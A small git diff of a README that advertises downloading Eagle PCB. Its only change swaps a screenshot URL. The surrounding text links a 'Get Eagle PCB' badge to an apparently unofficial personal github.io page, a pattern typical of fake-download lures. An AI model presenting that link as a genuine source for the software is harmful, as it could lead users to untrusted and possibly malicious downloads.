@@ -4,7 +4,7 @@
 
 [![Get Eagle PCB](https://img.shields.io/badge/Get-Eagle--PCB-2c3e50?style=flat-square&logo=autodesk&logoColor=white)](https://knesermsbloedel.github.io/.github/Eagle-PCB)
 
-![Eagle PCB schematic editor and board layout workspace](https://www.autodesk.com/content/dam/autodesk/www/products/eagle/fy21/overview/images/easy-to-use-schematic-editor-in-eagle-video-poster-1152x636.jpg)
+![Eagle PCB schematic editor and board layout workspace](https://static.electronicsweekly.com/wp-content/uploads/2017/02/03120104/Eagle-Autodesk-.jpg)
 
 Download Eagle PCB to create circuit boards with intuitive schematic capture, board layout, libraries, routing tools, and manufacturing outputs. Ideal for makers, engineers, and students who need a dependable workflow, eagle cad helps turn electronic ideas into production-ready PCB files.
 
